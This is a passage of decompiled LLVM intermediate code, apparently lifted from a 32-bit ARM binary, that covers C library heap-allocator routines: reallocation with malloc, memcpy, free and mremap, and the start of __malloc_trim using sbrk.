  br i1 %v9_12624, label %dec_label_pc_12630, label %dec_label_pc_1262c

dec_label_pc_1262c:                               ; preds = %dec_label_pc_1260c, %dec_label_pc_12620
  %v0_1262c = call i32 @abort()
  store i32 %v0_1262c, i32* %r0.global-to-local, align 4
  %v0_12630.pre = load i32, i32* @r1, align 4
  %v1_12630.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_12630

dec_label_pc_12630:                               ; preds = %dec_label_pc_12620, %dec_label_pc_1262c
  %v1_12630 = phi i32 [ %v3_12618, %dec_label_pc_12620 ], [ %v1_12630.pre, %dec_label_pc_1262c ]
  %v0_12630 = phi i32 [ %v3_1260c, %dec_label_pc_12620 ], [ %v0_12630.pre, %dec_label_pc_1262c ]
  %v2_12630 = add i32 %v1_12630, 8
  %v3_12630 = inttoptr i32 %v2_12630 to i32*
  store i32 %v0_12630, i32* %v3_12630, align 4
  %v0_12634 = load i32, i32* %r2.global-to-local, align 4
  %v1_12634 = load i32, i32* %r1.global-to-local, align 4
  %v2_12634 = add i32 %v1_12634, 12
  %v3_12634 = inttoptr i32 %v2_12634 to i32*
  store i32 %v0_12634, i32* %v3_12634, align 4
  %v1_126f0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_126f0

dec_label_pc_1263c:                               ; preds = %dec_label_pc_125ac, %dec_label_pc_125fc, %dec_label_pc_125e8
  %v1_1263c = add i32 %v1_12580, -7
  store i32 %v1_1263c, i32* %r0.global-to-local, align 4
  %v1_12640 = call i32 @malloc(i32 %v1_1263c)
  store i32 %v1_12640, i32* @r0, align 4
  store i32 %v1_12640, i32* %r1.global-to-local, align 4
  %v2_12644 = icmp eq i32 %v1_12640, 0
  br i1 %v2_12644, label %bb31, label %dec_label_pc_12650

bb31:                                             ; preds = %dec_label_pc_1263c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12824

dec_label_pc_12650:                               ; preds = %dec_label_pc_1263c
  %v1_12658.pre = load i32, i32* @r4, align 4
  %v1_12650 = add i32 %v1_12640, -4
  %v2_12650 = inttoptr i32 %v1_12650 to i32*
  %v3_12650 = load i32, i32* %v2_12650, align 4
  store i32 %v3_12650, i32* @r3, align 4
  %v1_12654 = add i32 %v1_12640, -8
  store i32 %v1_12654, i32* @r7, align 4
  %v9_12658 = icmp eq i32 %v1_12654, %v1_12658.pre
  br i1 %v9_12658, label %.thread2, label %dec_label_pc_12668

.thread2:                                         ; preds = %dec_label_pc_12650
  %v2_1265c = and i32 %v3_12650, -4
  store i32 %v2_1265c, i32* %r3.global-to-local, align 4
  %v2_12660 = load i32, i32* @r6, align 4
  %v3_12660 = add i32 %v2_12660, %v2_1265c
  store i32 %v3_12660, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_126f0

dec_label_pc_12668:                               ; preds = %dec_label_pc_12650
  %v0_12668 = load i32, i32* @r6, align 4
  %v1_12668 = add i32 %v0_12668, -4
  store i32 %v1_12668, i32* @r2, align 4
  %v3_1266c = udiv i32 %v1_12668, 4
  store i32 %v3_1266c, i32* @ip, align 4
  %tmp37 = and i32 %v1_12668, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_12674 = icmp ult i32 %v1_12668, 36
  %v3_12674 = or i1 %tmp38, %v2_12674
  %v0_12684 = load i32, i32* @r5, align 4
  br i1 %v3_12674, label %dec_label_pc_12684, label %dec_label_pc_12678

dec_label_pc_12678:                               ; preds = %dec_label_pc_12668
  store i32 %v0_12684, i32* @r1, align 4
  %v0_1267c = call i32 @memcpy()
  store i32 %v0_1267c, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_12684:                               ; preds = %dec_label_pc_12668
  %v1_12684 = inttoptr i32 %v0_12684 to i32*
  %v2_12684 = load i32, i32* %v1_12684, align 4
  store i32 %v2_12684, i32* %r3.global-to-local, align 4
  %v2_12688 = inttoptr i32 %v1_12640 to i32*
  store i32 %v2_12684, i32* %v2_12688, align 4
  %v0_1268c = load i32, i32* @r5, align 4
  %v1_1268c = add i32 %v0_1268c, 4
  %v2_1268c = inttoptr i32 %v1_1268c to i32*
  %v3_1268c = load i32, i32* %v2_1268c, align 4
  store i32 %v3_1268c, i32* %r3.global-to-local, align 4
  %v1_12690 = load i32, i32* %r1.global-to-local, align 4
  %v2_12690 = add i32 %v1_12690, 4
  %v3_12690 = inttoptr i32 %v2_12690 to i32*
  store i32 %v3_1268c, i32* %v3_12690, align 4
  %v0_12694 = load i32, i32* @r5, align 4
  %v1_12694 = add i32 %v0_12694, 8
  %v2_12694 = inttoptr i32 %v1_12694 to i32*
  %v3_12694 = load i32, i32* %v2_12694, align 4
  store i32 %v3_12694, i32* %r3.global-to-local, align 4
  %v0_12698 = load i32, i32* @ip, align 4
  %v1_1269c = load i32, i32* %r1.global-to-local, align 4
  %v2_1269c = add i32 %v1_1269c, 8
  %v3_1269c = inttoptr i32 %v2_1269c to i32*
  store i32 %v3_12694, i32* %v3_1269c, align 4
  %tmp39 = icmp ult i32 %v0_12698, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_126a4

dec_label_pc_126a4:                               ; preds = %dec_label_pc_12684
  %v0_126a4 = load i32, i32* @r5, align 4
  %v1_126a4 = add i32 %v0_126a4, 12
  %v2_126a4 = inttoptr i32 %v1_126a4 to i32*
  %v3_126a4 = load i32, i32* %v2_126a4, align 4
  store i32 %v3_126a4, i32* %r3.global-to-local, align 4
  %v1_126a8 = load i32, i32* %r1.global-to-local, align 4
  %v2_126a8 = add i32 %v1_126a8, 12
  %v3_126a8 = inttoptr i32 %v2_126a8 to i32*
  store i32 %v3_126a4, i32* %v3_126a8, align 4
  %v0_126ac = load i32, i32* @r5, align 4
  %v1_126ac = add i32 %v0_126ac, 16
  %v2_126ac = inttoptr i32 %v1_126ac to i32*
  %v3_126ac = load i32, i32* %v2_126ac, align 4
  store i32 %v3_126ac, i32* %r3.global-to-local, align 4
  %v0_126b0 = load i32, i32* @ip, align 4
  %v1_126b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_126b4 = add i32 %v1_126b4, 16
  %v3_126b4 = inttoptr i32 %v2_126b4 to i32*
  store i32 %v3_126ac, i32* %v3_126b4, align 4
  %tmp40 = icmp ult i32 %v0_126b0, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_126bc

dec_label_pc_126bc:                               ; preds = %dec_label_pc_126a4
  %v0_126bc = load i32, i32* @r5, align 4
  %v1_126bc = add i32 %v0_126bc, 20
  %v2_126bc = inttoptr i32 %v1_126bc to i32*
  %v3_126bc = load i32, i32* %v2_126bc, align 4
  store i32 %v3_126bc, i32* %r3.global-to-local, align 4
  %v1_126c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_126c0 = add i32 %v1_126c0, 20
  %v3_126c0 = inttoptr i32 %v2_126c0 to i32*
  store i32 %v3_126bc, i32* %v3_126c0, align 4
  %v0_126c4 = load i32, i32* @r5, align 4
  %v1_126c4 = add i32 %v0_126c4, 24
  %v2_126c4 = inttoptr i32 %v1_126c4 to i32*
  %v3_126c4 = load i32, i32* %v2_126c4, align 4
  store i32 %v3_126c4, i32* %r3.global-to-local, align 4
  %v1_126c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_126c8 = add i32 %v1_126c8, 24
  %v3_126c8 = inttoptr i32 %v2_126c8 to i32*
  store i32 %v3_126c4, i32* %v3_126c8, align 4
  %v0_126cc = load i32, i32* @ip, align 4
  %v7_126cc = icmp eq i32 %v0_126cc, 9
  br i1 %v7_126cc, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_126bc
  %v1_126d0 = load i32, i32* @r5, align 4
  %v2_126d0 = add i32 %v1_126d0, 28
  %v3_126d0 = inttoptr i32 %v2_126d0 to i32*
  %v4_126d0 = load i32, i32* %v3_126d0, align 4
  store i32 %v4_126d0, i32* %r3.global-to-local, align 4
  %v2_126d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_126d4 = add i32 %v2_126d4, 28
  %v4_126d4 = inttoptr i32 %v3_126d4 to i32*
  store i32 %v4_126d0, i32* %v4_126d4, align 4
  %v1_126d8 = load i32, i32* @r5, align 4
  %v2_126d8 = add i32 %v1_126d8, 32
  %v3_126d8 = inttoptr i32 %v2_126d8 to i32*
  %v4_126d8 = load i32, i32* %v3_126d8, align 4
  store i32 %v4_126d8, i32* %r3.global-to-local, align 4
  %v2_126dc = load i32, i32* %r1.global-to-local, align 4
  %v3_126dc = add i32 %v2_126dc, 32
  %v4_126dc = inttoptr i32 %v3_126dc to i32*
  store i32 %v4_126d8, i32* %v4_126dc, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_126bc, %dec_label_pc_126a4, %dec_label_pc_12684, %dec_label_pc_12678, %bb32
  %v0_126e0 = load i32, i32* @r5, align 4
  store i32 %v0_126e0, i32* @r0, align 4
  %v0_126e4 = call i32 @free()
  store i32 %v0_126e4, i32* %r0.global-to-local, align 4
  %v0_126e8 = load i32, i32* @r7, align 4
  %v1_126e8 = add i32 %v0_126e8, 8
  store i32 %v1_126e8, i32* @r4, align 4
  br label %dec_label_pc_12824

dec_label_pc_126f0:                               ; preds = %bb30, %.thread2, %dec_label_pc_12630
  %v0_12704 = phi i32 [ %v3_12660, %.thread2 ], [ %v1_12578, %bb30 ], [ %v1_126f0.pre, %dec_label_pc_12630 ]
  %v0_126f0 = load i32, i32* @sb, align 4
  %v2_126f0 = sub i32 %v0_12704, %v0_126f0
  store i32 %v2_126f0, i32* %r1.global-to-local, align 4
  %v0_126f8 = load i32, i32* @sl, align 4
  %v1_126f8 = add i32 %v0_126f8, 4
  %v2_126f8 = inttoptr i32 %v1_126f8 to i32*
  %v3_126f8 = load i32, i32* %v2_126f8, align 4
  %tmp41 = icmp ugt i32 %v2_126f0, 15
  %v1_12720 = urem i32 %v3_126f8, 2
  store i32 %v1_12720, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_12720, label %dec_label_pc_12700

dec_label_pc_12700:                               ; preds = %dec_label_pc_126f0
  %v2_12704 = or i32 %v1_12720, %v0_12704
  store i32 %v2_12704, i32* %r3.global-to-local, align 4
  store i32 %v2_12704, i32* %v2_126f8, align 4
  %v0_1270c = load i32, i32* @sl, align 4
  %v1_1270c = load i32, i32* %r0.global-to-local, align 4
  %v2_1270c = add i32 %v1_1270c, %v0_1270c
  store i32 %v2_1270c, i32* %r2.global-to-local, align 4
  %v1_12710 = add i32 %v2_1270c, 4
  %v2_12710 = inttoptr i32 %v1_12710 to i32*
  %v3_12710 = load i32, i32* %v2_12710, align 4
  %v1_12714 = or i32 %v3_12710, 1
  store i32 %v1_12714, i32* %r3.global-to-local, align 4
  store i32 %v1_12714, i32* %v2_12710, align 4
  br label %dec_label_pc_12750

dec_label_pc_12720:                               ; preds = %dec_label_pc_126f0
  %v2_12724 = add i32 %v0_126f8, %v0_126f0
  store i32 %v2_12724, i32* %r0.global-to-local, align 4
  %v2_12728 = or i32 %v1_12720, %v0_126f0
  store i32 %v2_12728, i32* %r3.global-to-local, align 4
  %v1_1272c = or i32 %v2_126f0, 1
  store i32 %v1_1272c, i32* %r2.global-to-local, align 4
  store i32 %v2_12728, i32* %v2_126f8, align 4
  %v0_12734 = load i32, i32* %r2.global-to-local, align 4
  %v1_12734 = load i32, i32* %r0.global-to-local, align 4
  %v2_12734 = add i32 %v1_12734, 4
  %v3_12734 = inttoptr i32 %v2_12734 to i32*
  store i32 %v0_12734, i32* %v3_12734, align 4
  %v0_12738 = load i32, i32* %r0.global-to-local, align 4
  %v1_12738 = load i32, i32* %r1.global-to-local, align 4
  %v2_12738 = add i32 %v1_12738, %v0_12738
  store i32 %v2_12738, i32* %r2.global-to-local, align 4
  %v1_1273c = add i32 %v2_12738, 4
  %v2_1273c = inttoptr i32 %v1_1273c to i32*
  %v3_1273c = load i32, i32* %v2_1273c, align 4
  %v1_12740 = or i32 %v3_1273c, 1
  store i32 %v1_12740, i32* %r3.global-to-local, align 4
  store i32 %v1_12740, i32* %v2_1273c, align 4
  %v0_12748 = load i32, i32* %r0.global-to-local, align 4
  %v1_12748 = add i32 %v0_12748, 8
  store i32 %v1_12748, i32* @r0, align 4
  %v0_1274c = call i32 @free()
  store i32 %v0_1274c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12750

dec_label_pc_12750:                               ; preds = %dec_label_pc_12700, %dec_label_pc_12720
  %v0_12750 = load i32, i32* @sl, align 4
  %v1_12750 = add i32 %v0_12750, 8
  store i32 %v1_12750, i32* @r4, align 4
  br label %dec_label_pc_12824

dec_label_pc_12758:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r1.global-to-local, align 4
  %v4_12760 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 64) to i32*), align 4
  store i32 %v4_12760, i32* @r8, align 4
  %v2_12764 = inttoptr i32 %v1_12574 to i32*
  %v3_12764 = load i32, i32* %v2_12764, align 4
  store i32 %v3_12764, i32* @r4, align 4
  %v1_12768 = add i32 %v4_12760, 860
  %v2_12768 = inttoptr i32 %v1_12768 to i32*
  %v3_12768 = load i32, i32* %v2_12768, align 4
  %v1_1276c = add i32 %v3_12764, 4
  %v1_12770 = add i32 %v3_12768, -1
  store i32 %v1_12770, i32* %r2.global-to-local, align 4
  %v2_12774 = add i32 %v1_1276c, %v1_12770
  %v1_12778 = load i32, i32* @sb, align 4
  %v2_12778 = add i32 %v2_12774, %v1_12778
  store i32 %v2_12778, i32* %r3.global-to-local, align 4
  %v2_1277c = sub i32 0, %v3_12768
  %v3_1277c = and i32 %v2_12778, %v2_1277c
  store i32 %v3_1277c, i32* @r7, align 4
  %v2_12780 = sub i32 %v3_1277c, %v3_12764
  store i32 %v2_12780, i32* @fp, align 4
  %v9_12784 = icmp eq i32 %v1_12578, %v2_12780
  br i1 %v9_12784, label %dec_label_pc_127f8, label %dec_label_pc_1278c

dec_label_pc_1278c:                               ; preds = %dec_label_pc_12758
  %v2_1278c = sub i32 %v1_12574, %v3_12764
  store i32 %v2_1278c, i32* %r0.global-to-local, align 4
  %v2_12790 = add i32 %v3_12764, %v1_12578
  store i32 %v2_12790, i32* %r1.global-to-local, align 4
  store i32 %v3_1277c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_1279c = call i32 @mremap(i32 %v2_1278c, i32 %v2_12790, i32 %v3_1277c, i32 1)
  store i32 %v4_1279c, i32* %r0.global-to-local, align 4
  %v7_127a0 = icmp eq i32 %v4_1279c, -1
  br i1 %v7_127a0, label %dec_label_pc_127ec, label %dec_label_pc_127a8

dec_label_pc_127a8:                               ; preds = %dec_label_pc_1278c
  %v1_127a8 = load i32, i32* @r4, align 4
  %v2_127a8 = add i32 %v1_127a8, %v4_1279c
  store i32 %v2_127a8, i32* %r0.global-to-local, align 4
  %v0_127ac = load i32, i32* @fp, align 4
  %v1_127ac = or i32 %v0_127ac, 2
  store i32 %v1_127ac, i32* %r3.global-to-local, align 4
  %v2_127b0 = add i32 %v2_127a8, 4
  %v3_127b0 = inttoptr i32 %v2_127b0 to i32*
  store i32 %v1_127ac, i32* %v3_127b0, align 4
  %v0_127b4 = load i32, i32* @r8, align 4
  %v1_127b4 = add i32 %v0_127b4, 868
  %v2_127b4 = inttoptr i32 %v1_127b4 to i32*
  %v3_127b4 = load i32, i32* %v2_127b4, align 4
  store i32 %v3_127b4, i32* %r3.global-to-local, align 4
  %v1_127b8 = add i32 %v0_127b4, 880
  %v2_127b8 = inttoptr i32 %v1_127b8 to i32*
  %v3_127b8 = load i32, i32* %v2_127b8, align 4
  store i32 %v3_127b8, i32* %r2.global-to-local, align 4
  %v0_127bc = load i32, i32* @r6, align 4
  %v2_127bc = sub i32 %v3_127b4, %v0_127bc
  store i32 %v2_127bc, i32* %r3.global-to-local, align 4
  %v1_127c0 = load i32, i32* @r7, align 4
  %v2_127c0 = add i32 %v1_127c0, %v2_127bc
  store i32 %v2_127c0, i32* %r1.global-to-local, align 4
  %v1_127c4 = add i32 %v0_127b4, 872
  %v2_127c4 = inttoptr i32 %v1_127c4 to i32*
  %v3_127c4 = load i32, i32* %v2_127c4, align 4
  store i32 %v3_127c4, i32* %r3.global-to-local, align 4
  %v1_127cc = add i32 %v0_127b4, 884
  %v2_127cc = inttoptr i32 %v1_127cc to i32*
  %v3_127cc = load i32, i32* %v2_127cc, align 4
  store i32 %v3_127cc, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_127c0, %v3_127b8
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_127a8
  store i32 %v2_127c0, i32* %v2_127b8, align 4
  %v0_127d4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_127d4.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_127a8, %bb33
  %v1_127d4 = phi i32 [ %v0_127b4, %dec_label_pc_127a8 ], [ %v1_127d4.pre, %bb33 ]
  %v0_127d4 = phi i32 [ %v2_127c0, %dec_label_pc_127a8 ], [ %v0_127d4.pre, %bb33 ]
  %v2_127d4 = add i32 %v1_127d4, 868
  %v3_127d4 = inttoptr i32 %v2_127d4 to i32*
  store i32 %v0_127d4, i32* %v3_127d4, align 4
  %v0_127d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_127d8 = load i32, i32* %r3.global-to-local, align 4
  %v2_127d8 = add i32 %v1_127d8, %v0_127d8
  store i32 %v2_127d8, i32* %r1.global-to-local, align 4
  %v1_127dc = load i32, i32* %r2.global-to-local, align 4
  %v0_127e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_127e0 = add i32 %v0_127e0, 8
  store i32 %v1_127e0, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_127d8, %v1_127dc
  br i1 %tmp43, label %bb35, label %dec_label_pc_12824

bb35:                                             ; preds = %bb34
  %v5_127e4 = load i32, i32* @r8, align 4
  %v6_127e4 = add i32 %v5_127e4, 884
  %v7_127e4 = inttoptr i32 %v6_127e4 to i32*
  store i32 %v2_127d8, i32* %v7_127e4, align 4
  br label %dec_label_pc_12824

dec_label_pc_127ec:                               ; preds = %dec_label_pc_1278c
  %v0_127ec = load i32, i32* @sb, align 4
  %v1_127ec = add i32 %v0_127ec, 4
  store i32 %v1_127ec, i32* %r3.global-to-local, align 4
  %v0_127f0 = load i32, i32* @r6, align 4
  %v3_127f0 = icmp ult i32 %v0_127f0, %v1_127ec
  br i1 %v3_127f0, label %dec_label_pc_12800, label %dec_label_pc_127ec.dec_label_pc_127f8_crit_edge

dec_label_pc_127ec.dec_label_pc_127f8_crit_edge:  ; preds = %dec_label_pc_127ec
  %v0_127f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_127f8

dec_label_pc_127f8:                               ; preds = %dec_label_pc_127ec.dec_label_pc_127f8_crit_edge, %dec_label_pc_12758
  %v0_127f8 = phi i32 [ %v0_127f8.pre, %dec_label_pc_127ec.dec_label_pc_127f8_crit_edge ], [ %v0_12560, %dec_label_pc_12758 ]
  store i32 %v0_127f8, i32* @r4, align 4
  br label %dec_label_pc_12824

dec_label_pc_12800:                               ; preds = %dec_label_pc_127ec
  %v1_12800 = add i32 %v0_127ec, -7
  store i32 %v1_12800, i32* %r0.global-to-local, align 4
  %v1_12804 = call i32 @malloc(i32 %v1_12800)
  store i32 %v1_12804, i32* @r0, align 4
  store i32 %v1_12804, i32* @r4, align 4
  %v2_12808 = icmp eq i32 %v1_12804, 0
  br i1 %v2_12808, label %dec_label_pc_12824, label %dec_label_pc_12810

dec_label_pc_12810:                               ; preds = %dec_label_pc_12800
  %v0_12810 = load i32, i32* @r6, align 4
  %v1_12810 = add i32 %v0_12810, -8
  store i32 %v1_12810, i32* @r2, align 4
  %v0_12814 = load i32, i32* @r5, align 4
  store i32 %v0_12814, i32* @r1, align 4
  %v0_12818 = call i32 @memcpy()
  %v0_1281c = load i32, i32* @r5, align 4
  store i32 %v0_1281c, i32* @r0, align 4
  %v0_12820 = call i32 @free()
  store i32 %v0_12820, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12824

dec_label_pc_12824:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_12800, %dec_label_pc_127f8, %dec_label_pc_12750, %.thread6, %dec_label_pc_125c0, %dec_label_pc_12810
  store i32 %v2_1250c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21694.308 to i32), i32* %r2.global-to-local, align 4
  %v4_12834 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21694.308 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12834)
  br label %dec_label_pc_12840

dec_label_pc_12840:                               ; preds = %dec_label_pc_12540, %dec_label_pc_124e8, %dec_label_pc_124d0, %dec_label_pc_12824
  %v0_12840 = load i32, i32* @r4, align 4
  store i32 %v0_12840, i32* %r0.global-to-local, align 4
  store i32 %v3_124b0, i32* @r4, align 4
  store i32 %v6_124b0, i32* @r5, align 4
  store i32 %v9_124b0, i32* @r6, align 4
  store i32 %v12_124b0, i32* @r7, align 4
  store i32 %v15_124b0, i32* @r8, align 4
  store i32 %v18_124b0, i32* @sb, align 4
  store i32 %v21_124b0, i32* @sl, align 4
  store i32 %v24_124b0, i32* @fp, align 4
  store i32 %v27_124b0, i32* @lr, align 4
  ret i32 %v0_12840

; uselistorder directives
  uselistorder i32 %v2_127d8, { 1, 0, 2 }
  uselistorder i32 %v2_127c0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1279c, { 1, 0, 2 }
  uselistorder i32 %v3_1277c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12720, { 2, 1, 0 }
  uselistorder i32 %v2_126f0, { 1, 0, 2 }
  uselistorder i32 %v0_12684, { 1, 0 }
  uselistorder i32 %v1_12640, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_125a4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1259c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_12580, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_12578, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_12574, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_12564, { 1, 0 }
  uselistorder i32 %v0_12560, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_12538, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 12, 8, 9, 10, 11, 23, 13, 15, 14, 16, 22, 24, 17, 18, 19, 20, 21, 27, 26, 25, 28, 30, 29 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_12840, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12824, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_12750, { 1, 0 }
  uselistorder label %dec_label_pc_126f0, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1263c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12630, { 1, 0 }
  uselistorder label %dec_label_pc_1262c, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_12854(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12854:
  %v0_12854 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12854, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_12854
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_12854, %bb
  %v4_1286c = phi i32 [ %arg1, %dec_label_pc_12854 ], [ 0, %bb ]
  ret i32 %v4_1286c

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v1_12870 = add i32 %arg2, 44
  %v2_12870 = inttoptr i32 %v1_12870 to i32*
  %v3_12870 = load i32, i32* %v2_12870, align 4
  %v12_12874 = load i32, i32* @r7, align 4
  %v1_12878 = add i32 %v3_12870, 4
  %v2_12878 = inttoptr i32 %v1_12878 to i32*
  %v3_12878 = load i32, i32* %v2_12878, align 4
  %v1_1287c = add i32 %arg2, 860
  %v2_1287c = inttoptr i32 %v1_1287c to i32*
  %v3_1287c = load i32, i32* %v2_1287c, align 4
  store i32 %v3_1287c, i32* @r4, align 4
  %v1_12880 = and i32 %v3_12878, -4
  store i32 %v1_12880, i32* @r6, align 4
  %v1_12884 = add i32 %v1_12880, -17
  %v2_12888 = add i32 %v1_12884, %v3_1287c
  store i32 %arg2, i32* @r5, align 4
  %v2_12894 = sub i32 %v2_12888, %arg1
  store i32 %v3_1287c, i32* %r1.global-to-local, align 4
  %v2_1289c = udiv i32 %v2_12894, %v3_1287c
  %v1_128a0 = add i32 %v2_1289c, -1
  store i32 %v1_128a0, i32* %r0.global-to-local, align 4
  %v2_128a4 = mul i32 %v1_128a0, %v3_1287c
  store i32 %v2_128a4, i32* @r7, align 4
  %v2_128a8 = icmp eq i32 %v2_128a4, 0
  store i1 %v2_128a8, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_128a4, 1
  br i1 %tmp8, label %dec_label_pc_12910, label %dec_label_pc_128b0

dec_label_pc_128b0:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_128b4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_128b4, i32* %r0.global-to-local, align 4
  %v0_128b8 = load i32, i32* @r5, align 4
  %v1_128b8 = add i32 %v0_128b8, 44
  %v2_128b8 = inttoptr i32 %v1_128b8 to i32*
  %v3_128b8 = load i32, i32* %v2_128b8, align 4
  %v0_128bc = load i32, i32* @r6, align 4
  %v2_128bc = add i32 %v0_128bc, %v3_128b8
  %v9_128c0 = icmp eq i32 %v1_128b4, %v2_128bc
  store i1 %v9_128c0, i1* @cpsr_z, align 1
  store i32 %v1_128b4, i32* @r4, align 4
  br i1 %v9_128c0, label %dec_label_pc_128cc, label %dec_label_pc_12910

dec_label_pc_128cc:                               ; preds = %dec_label_pc_128b0
  %v0_128cc = load i32, i32* @r7, align 4
  %v1_128cc = sub i32 0, %v0_128cc
  store i32 %v1_128cc, i32* %r0.global-to-local, align 4
  %v1_128d0 = call i32 @__GI_sbrk(i32 %v1_128cc)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_128d8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_128d8, i32* %r0.global-to-local, align 4
  %v7_128dc = icmp eq i32 %v1_128d8, -1
  store i1 %v7_128dc, i1* @cpsr_z, align 1
  br i1 %v7_128dc, label %dec_label_pc_12910, label %dec_label_pc_128e4

dec_label_pc_128e4:                               ; preds = %dec_label_pc_128cc
  %v0_128e4 = load i32, i32* @r4, align 4
  %v2_128e4 = sub i32 %v0_128e4, %v1_128d8
  store i32 %v2_128e4, i32* %r0.global-to-local, align 4
  %v9_128e4 = icmp eq i32 %v0_128e4, %v1_128d8
  store i1 %v9_128e4, i1* @cpsr_z, align 1
  br i1 %v9_128e4, label %dec_label_pc_12910, label %dec_label_pc_128ec

dec_label_pc_128ec:                               ; preds = %dec_label_pc_128e4
  %v0_128ec = load i32, i32* @r5, align 4
  %v1_128ec = add i32 %v0_128ec, 872
  %v2_128ec = inttoptr i32 %v1_128ec to i32*
  %v3_128ec = load i32, i32* %v2_128ec, align 4
  %v1_128f0 = load i32, i32* @r6, align 4
  %v2_128f0 = sub i32 %v1_128f0, %v2_128e4
  store i32 %v2_128f0, i32* %r2.global-to-local, align 4
  %v1_128f4 = add i32 %v0_128ec, 44
  %v2_128f4 = inttoptr i32 %v1_128f4 to i32*
  %v3_128f4 = load i32, i32* %v2_128f4, align 4
  store i32 %v3_128f4, i32* %r1.global-to-local, align 4
  %v2_128f8 = sub i32 %v3_128ec, %v2_128e4
  %v1_128fc = or i32 %v2_128f0, 1
  store i32 %v1_128fc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_128f8, i32* %v2_128ec, align 4
  %v0_12908 = load i32, i32* %r2.global-to-local, align 4
  %v1_12908 = load i32, i32* %r1.global-to-local, align 4
  %v2_12908 = add i32 %v1_12908, 4
  %v3_12908 = inttoptr i32 %v2_12908 to i32*
  store i32 %v0_12908, i32* %v3_12908, align 4
  %v1_1291c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12914

dec_label_pc_12910:                               ; preds = %dec_label_pc_128b0, %dec_label_pc_128e4, %dec_label_pc_128cc, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12914

dec_label_pc_12914:                               ; preds = %dec_label_pc_128ec, %dec_label_pc_12910
